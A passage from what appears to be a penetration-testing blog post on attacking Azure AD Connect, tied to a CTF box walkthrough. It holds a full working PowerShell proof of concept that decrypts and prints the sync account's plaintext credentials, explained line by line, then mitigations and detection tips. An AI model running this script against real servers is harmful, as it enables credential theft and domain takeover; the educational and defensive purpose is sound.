+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20whoami%20/groups">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  whoami /groups</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p>Look for &ldquo;BUILTIN\Administrators&rdquo; or &ldquo;ADSyncAdmins&rdquo; in the output.</p>
+</li>
+<li>
+<p>+Note+: It is also worth checking if the user is part of any other Administrator groups with inherited permissions etc.</p>
+</li>
+</ul>
+<h3 id="8-dot-check-if-we-can-interact-with-the-database--sql-custom-installation">8. Check if we can interact with the database (SQL Custom installation):</h3>
+<ul>
+<li>In this example if the default <code>LocalDB</code> is NOT being used we can see if it&rsquo;s possible to query the underlying database using <code>sqlcmd</code> (if it&rsquo;s installed)
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sqlcmd%20-S%20%3cFQDNINSTANCE%3e%20-Q%20%22SELECT%20name%20FROM%20master.dbo.sysdatabases%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlcmd -S &lt;FQDNINSTANCE&gt; -Q <span style="color:#e6db74">&#34;SELECT name FROM master.dbo.sysdatabases&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h2 id="88955c">+Attacking Azure AD Connect+</h2>
+<h3 id="exploitating-azure-ad-connect-using-powershell">Exploitating Azure AD Connect Using PowerShell:</h3>
+<p><strong>Here&rsquo;s a complete PowerShell script that demonstrates the exploitation process</strong>:</p>
+<ul>
+<li>This script must be run on the same machine as the Azure AD Connect server.</li>
+<li>This script must be run with the same privileges as the MSOL account.</li>
+<li>This script is by <code>@_xpn_</code> &amp; the original can be found here:
+<ul>
+<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></li>
+<li><a href="https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1">https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1</a></li>
+</ul>
+</li>
+<li>+Note+:
+<ul>
+<li>I am using this script and explaining it here for educational purposes.</li>
+<li>You can see my walkthrough for the box Monteverde to see a full demonstration of this in action.
+<ul>
+<li><a href="https://bloodstiller.com/walkthroughs/monteverde-box/">https://bloodstiller.com/walkthroughs/monteverde-box/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;AD Connect Sync Credential Extract POC (@_xpn_)</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
+</span></span><span style="display:flex;"><span>$client.Open()
+</span></span><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>$key_id = $reader.GetInt32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>$instance_id = $reader.GetGuid(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>$entropy = $reader.GetGuid(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>$reader.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>$config = $reader.GetString(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>$crypted = $reader.GetString(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>$reader.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add-type -path <span style="color:#e6db74">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
+</span></span><span style="display:flex;"><span>$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+</span></span><span style="display:flex;"><span>$km.LoadKeySet($entropy, $instance_id, $key_id)
+</span></span><span style="display:flex;"><span>$key = $null
+</span></span><span style="display:flex;"><span>$km.GetActiveCredentialKey([<span style="color:#66d9ef">ref</span>]$key)
+</span></span><span style="display:flex;"><span>$key2 = $null
+</span></span><span style="display:flex;"><span>$km.GetKey(<span style="color:#ae81ff">1</span>, [<span style="color:#66d9ef">ref</span>]$key2)
+</span></span><span style="display:flex;"><span>$decrypted = $null
+</span></span><span style="display:flex;"><span>$key2.DecryptBase64ToString($crypted, [<span style="color:#66d9ef">ref</span>]$decrypted)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$domain = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Domain: &#34;</span> + $domain.Domain)
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Username: &#34;</span> + $username.Username)
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Password: &#34;</span> + $password.Password)</span></span></code></pre></div>
+    
+</div>
+<p><strong>Let&rsquo;s break down the key parts of this exploit</strong>:</p>
+<h4 id="1-dot-connecting-to-the-database">1. Connecting to the <code>Database</code>:</h4>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>LocalDB Version:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$client%20=%20new-object%20System.Data.SqlClient.SqlConnection%20-ArgumentList%20%22Data%20Source=%28localdb%29%5c.%5cADSync;Initial%20Catalog=ADSync%22%0a$client.Open%28%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
+</span></span><span style="display:flex;"><span>$client.Open()</span></span></code></pre></div>
+    
+</div>
+<p><strong>Line-by-line breakdown</strong>:</p>
+<ol>
+<li>
+<p><code>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;</code></p>
+<ul>
+<li>Creates a new SqlConnection object to connect to the <code>LocalDB</code> instance.</li>
+<li><code>&quot;Data Source=(localdb)\.\ADSync&quot;</code> specifies the <code>LocalDB</code> instance name.</li>
+<li><code>&quot;Initial Catalog=ADSync&quot;</code> specifies the database name.</li>
+</ul>
+</li>
+<li>
+<p><code>$client.Open()</code></p>
+<ul>
+<li>Opens the connection to the database.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>SQL Server Version:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$client%20=%20new-object%20System.Data.SqlClient.SqlConnection%20-ArgumentList%20%22Server=127.0.0.1;Database=ADSync;Integrated%20Security=True%22%0a$client.Open%28%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True&#34;</span>
+</span></span><span style="display:flex;"><span>$client.Open()</span></span></code></pre></div>
+    
+</div>
+<p><strong>Line-by-line breakdown</strong>:</p>
+<ol>
+<li>
+<p><code>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Server=127.0.0.1;Database=ADSync;Integrated Security=True&quot;</code></p>
+<ul>
+<li>Creates a new SqlConnection object to connect to a full SQL Server instance.</li>
+<li><code>&quot;Server=127.0.0.1&quot;</code> specifies the local machine&rsquo;s loopback address, as SQL is running internally.</li>
+<li><code>&quot;Database=ADSync&quot;</code> specifies the database name.</li>
+<li><code>&quot;Integrated Security=True&quot;</code> enables Windows Authentication, using the current user&rsquo;s credentials.
+<ul>
+<li>The current user would need to have the correct permissions on the SQL database.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>$client.Open()</code></p>
+<ul>
+<li>Opens the connection to the database.</li>
+</ul>
+</li>
+</ol>
+<p>This version would be used if attacking a full SQL Server instance running locally on the host, rather than the standard <code>LocalDB</code> installation.</p>
+</li>
+</ul>
+<h4 id="2-dot-retrieving-encryption-keys">2. Retrieving Encryption Keys</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$cmd%20=%20$client.CreateCommand%28%29%0a$cmd.CommandText%20=%20%22SELECT%20keyset_id,%20instance_id,%20entropy%20FROM%20mms_server_configuration%22%0a$reader%20=%20$cmd.ExecuteReader%28%29%0a$reader.Read%28%29%20%7c%20Out-Null%0a$key_id%20=%20$reader.GetInt32%280%29%0a$instance_id%20=%20$reader.GetGuid%281%29%0a$entropy%20=%20$reader.GetGuid%282%29%0a$reader.Close%28%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>$key_id = $reader.GetInt32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>$instance_id = $reader.GetGuid(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>$entropy = $reader.GetGuid(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>$reader.Close()</span></span></code></pre></div>
+    
+</div>
+<p><strong>Line-by-line breakdown</strong>:</p>
+<ol>
+<li>
+<p><code>$cmd = $client.CreateCommand()</code></p>
+<ul>
+<li>Creates a new SqlCommand object associated with the connection.</li>
+</ul>
+</li>
+<li>
+<p><code>$cmd.CommandText = &quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</code></p>
+<ul>
+<li>Sets the SQL query to retrieve encryption key information.</li>
+</ul>
+</li>
+<li>
+<p><code>$reader = $cmd.ExecuteReader()</code></p>
+<ul>
+<li>Executes the query and returns a SqlDataReader object.</li>
+</ul>
+</li>
+<li>
+<p><code>$reader.Read() | Out-Null</code></p>
+<ul>
+<li>Reads the first row of the result set.</li>
+</ul>
+</li>
+<li>
+<p><code>$key_id = $reader.GetInt32(0)</code></p>
+<ul>
+<li>Retrieves the keyset_id value from the first column.</li>
+</ul>
+</li>
+<li>
+<p><code>$instance_id = $reader.GetGuid(1)</code></p>
+<ul>
+<li>Retrieves the instance_id value from the second column.</li>
+</ul>
+</li>
+<li>
+<p><code>$entropy = $reader.GetGuid(2)</code></p>
+<ul>
+<li>Retrieves the entropy value from the third column.</li>
+</ul>
+</li>
+<li>
+<p><code>$reader.Close()</code></p>
+<ul>
+<li>Closes the reader to free up resources.</li>
+</ul>
+</li>
+</ol>
+<h4 id="3-dot-retrieving-encrypted-configuration">3. Retrieving Encrypted Configuration</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$cmd%20=%20$client.CreateCommand%28%29%0a$cmd.CommandText%20=%20%22SELECT%20private_configuration_xml,%20encrypted_configuration%20FROM%20mms_management_agent%20WHERE%20ma_type%20=%20%27AD%27%22%0a$reader%20=%20$cmd.ExecuteReader%28%29%0a$reader.Read%28%29%20%7c%20Out-Null%0a$config%20=%20$reader.GetString%280%29%0a$crypted%20=%20$reader.GetString%281%29%0a$reader.Close%28%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>$config = $reader.GetString(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>$crypted = $reader.GetString(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>$reader.Close()</span></span></code></pre></div>
+    
+</div>
+<p><strong>Line-by-line breakdown</strong>:</p>
+<ol>
+<li>
+<p><code>$cmd = $client.CreateCommand()</code></p>
+<ul>
+<li>Creates a new SqlCommand object.</li>
+</ul>
+</li>
+<li>
+<p><code>$cmd.CommandText = &quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'&quot;</code></p>
+<ul>
+<li>Sets the SQL query to retrieve the encrypted configuration for the AD management agent.</li>
+</ul>
+</li>
+<li>
+<p><code>$reader = $cmd.ExecuteReader()</code></p>
+<ul>
+<li>Executes the query and returns a SqlDataReader object.</li>
+</ul>
+</li>
+<li>
+<p><code>$reader.Read() | Out-Null</code></p>
+<ul>
+<li>Reads the first row of the result set.</li>
+</ul>
+</li>
+<li>
+<p><code>$config = $reader.GetString(0)</code></p>
+<ul>
+<li>Retrieves the private_configuration_xml value from the first column.</li>
+</ul>
+</li>
+<li>
+<p><code>$crypted = $reader.GetString(1)</code></p>
+<ul>
+<li>Retrieves the encrypted_configuration value from the second column.</li>
+</ul>
+</li>
+<li>
+<p><code>$reader.Close()</code></p>
+<ul>
+<li>Closes the reader.</li>
+</ul>
+</li>
+</ol>
+<h4 id="4-dot-decrypting-the-configuration">4. Decrypting the Configuration</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>add-type -path <span style="color:#e6db74">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
+</span></span><span style="display:flex;"><span>$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+</span></span><span style="display:flex;"><span>$km.LoadKeySet($entropy, $instance_id, $key_id)
+</span></span><span style="display:flex;"><span>$key = $null
+</span></span><span style="display:flex;"><span>$km.GetActiveCredentialKey([<span style="color:#66d9ef">ref</span>]$key)
+</span></span><span style="display:flex;"><span>$key2 = $null
+</span></span><span style="display:flex;"><span>$km.GetKey(<span style="color:#ae81ff">1</span>, [<span style="color:#66d9ef">ref</span>]$key2)
+</span></span><span style="display:flex;"><span>$decrypted = $null
+</span></span><span style="display:flex;"><span>$key2.DecryptBase64ToString($crypted, [<span style="color:#66d9ef">ref</span>]$decrypted)</span></span></code></pre></div>
+    
+</div>
+<p><strong>Line-by-line breakdown</strong>:</p>
+<ol>
+<li>
+<p><code>add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</code></p>
+<ul>
+<li>Loads the mcrypt.dll library for decryption.</li>
+</ul>
+</li>
+<li>
+<p><code>$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</code></p>
+<ul>
+<li>Creates a new KeyManager object for handling encryption keys.</li>
+</ul>
+</li>
+<li>
+<p><code>$km.LoadKeySet($entropy, $instance_id, $key_id)</code></p>
+<ul>
+<li>Loads the key set using the previously retrieved entropy, instance_id, and key_id.</li>
+</ul>
+</li>
+<li>
+<p><code>$key = $null</code></p>
+<ul>
+<li>Initializes a variable to store the active credential key.</li>
+</ul>
+</li>
+<li>
+<p><code>$km.GetActiveCredentialKey([ref]$key)</code></p>
+<ul>
+<li>Retrieves the active credential key.</li>
+</ul>
+</li>
+<li>
+<p><code>$key2 = $null</code></p>
+<ul>
+<li>Initializes a variable to store a secondary key.</li>
+</ul>
+</li>
+<li>
+<p><code>$km.GetKey(1, [ref]$key2)</code></p>
+<ul>
+<li>Retrieves the secondary key (key ID 1).</li>
+</ul>
+</li>
+<li>
+<p><code>$decrypted = $null</code></p>
+<ul>
+<li>Initializes a variable to store the decrypted configuration.</li>
+</ul>
+</li>
+<li>
+<p><code>$key2.DecryptBase64ToString($crypted, [ref]$decrypted)</code></p>
+<ul>
+<li>Decrypts the encrypted configuration using the secondary key.</li>
+</ul>
+</li>
+</ol>
+<h4 id="5-dot-extracting-credentials">5. Extracting Credentials</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$domain%20=%20select-xml%20-Content%20$config%20-XPath%20%22//parameter[@name=%27forest-login-domain%27]%22%20%7c%20select%20@%7bName%20=%20%27Domain%27;%20Expression%20=%20%7b$_.node.InnerXML%7d%7d%0a$username%20=%20select-xml%20-Content%20$config%20-XPath%20%22//parameter[@name=%27forest-login-user%27]%22%20%7c%20select%20@%7bName%20=%20%27Username%27;%20Expression%20=%20%7b$_.node.InnerXML%7d%7d%0a$password%20=%20select-xml%20-Content%20$decrypted%20-XPath%20%22//attribute%22%20%7c%20select%20@%7bName%20=%20%27Password%27;%20Expression%20=%20%7b$_.node.InnerText%7d%7d%0a%0aWrite-Host%20%28%22Domain:%20%22%20&#43;%20$domain.Domain%29%0aWrite-Host%20%28%22Username:%20%22%20&#43;%20$username.Username%29%0aWrite-Host%20%28%22Password:%20%22%20&#43;%20$password.Password%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$domain = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Domain: &#34;</span> + $domain.Domain)
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Username: &#34;</span> + $username.Username)
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Password: &#34;</span> + $password.Password)</span></span></code></pre></div>
+    
+</div>
+<p><strong>Line-by-line breakdown</strong>:</p>
+<ol>
+<li>
+<p><code>$domain = select-xml -Content $config -XPath &quot;//parameter[@name='forest-login-domain']&quot; | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}</code></p>
+<ul>
+<li>Extracts the domain from the configuration XML using XPath.</li>
+</ul>
+</li>
+<li>
+<p><code>$username = select-xml -Content $config -XPath &quot;//parameter[@name='forest-login-user']&quot; | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}</code></p>
+<ul>
+<li>Extracts the username from the configuration XML using XPath.</li>
+</ul>
+</li>
+<li>
+<p><code>$password = select-xml -Content $decrypted -XPath &quot;//attribute&quot; | select @{Name = 'Password'; Expression = {$_.node.InnerText}}</code></p>
+<ul>
+<li>Extracts the password from the decrypted configuration using XPath.</li>
+</ul>
+</li>
+<li>
+<p><code>Write-Host (&quot;Domain: &quot; + $domain.Domain)</code></p>
+<ul>
+<li>Displays the extracted domain.</li>
+</ul>
+</li>
+<li>
+<p><code>Write-Host (&quot;Username: &quot; + $username.Username)</code></p>
+<ul>
+<li>Displays the extracted username.</li>
+</ul>
+</li>
+<li>
+<p><code>Write-Host (&quot;Password: &quot; + $password.Password)</code></p>
+<ul>
+<li>Displays the extracted password.</li>
+</ul>
+</li>
+</ol>
+<h3 id="exploiting-ad-connect-using-adconnectdump--20241014084307-adconnectdump-dot-md">Exploiting AD Connect Using <a href="https://github.com/dirkjanm/adconnectdump?tab=readme-ov-file">adconnectdump</a>:</h3>
+<ul>
+<li>
+<p>It is also possible to dump credentials using <code>dirkjanm</code>&rsquo;s tools found in the <a href="https://github.com/dirkjanm/adconnectdump?tab=readme-ov-file">adconnect</a> repo:</p>
+<ul>
+<li>There are 3 different tools available which require specific circumstances to use. I will not go into detail here.</li>
+<li>I am just adding as a reference.</li>
+</ul>
+</li>
+<li>
+<p><strong>Building is required using Visual Studio</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-14-090121_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="example-of-this-attack">Example of this attack:</h2>
+<ul>
+<li>See my walkthrough for the box Monteverde
+<ul>
+<li><a href="https://bloodstiller.com/walkthroughs/monteverde-box/">https://bloodstiller.com/walkthroughs/monteverde-box/</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="mitigation-strategies">Mitigation Strategies</h2>
+<ol>
+<li>Implement strict access controls on the Azure AD Connect server.</li>
+<li>Use Just-In-Time (JIT) access for administrative tasks.</li>
+<li>Enable and monitor advanced auditing for the MSOL account.</li>
+<li>Consider using Pass-through Authentication (PTA) instead of PHS if feasible.</li>
+<li>Regularly rotate the MSOL account password.</li>
+<li>Implement network segmentation to limit access to the Azure AD Connect server.</li>
+<li>Use a hardware security module (HSM) for key storage if possible.</li>
+</ol>
+<h2 id="detection">Detection</h2>
+<p>Monitor for:</p>
+<ul>
+<li>Unusual queries to the <code>LocalDB</code> instance</li>
+<li>Attempts to load or access mcrypt.dll</li>
+<li>Unexpected use of the MSOL account, especially for replication activities</li>
+</ul>
+<p>By understanding this process, security teams can better protect their Azure AD Connect deployments and detect potential exploitation attempts.</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2108
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Oct 14 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
